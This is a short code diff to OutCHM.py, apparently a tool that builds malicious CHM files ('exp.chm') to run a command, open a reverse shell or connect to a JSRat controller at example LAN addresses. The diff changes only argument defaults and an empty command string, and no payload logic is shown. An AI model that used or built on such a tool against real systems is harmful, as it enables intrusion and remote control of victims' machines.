@@ -16,8 +16,8 @@ OutCHM.py -p 'whoami > c://1.txt'
 ''', 
 epilog='方便快捷！')
 parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
-parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080', default='http://192.168.0.100:8080')
-parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000', default='http://192.168.0.100:8000')
+parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080')
+parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000')
 parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
 args=parser.parse_args()
 
@@ -28,7 +28,7 @@ args=parser.parse_args()
 if len(sys.argv) < 1:
     sys.exit(1)
 
-command=''
+command=' '
 
 if args.payload is not None:
     # command=args.payload
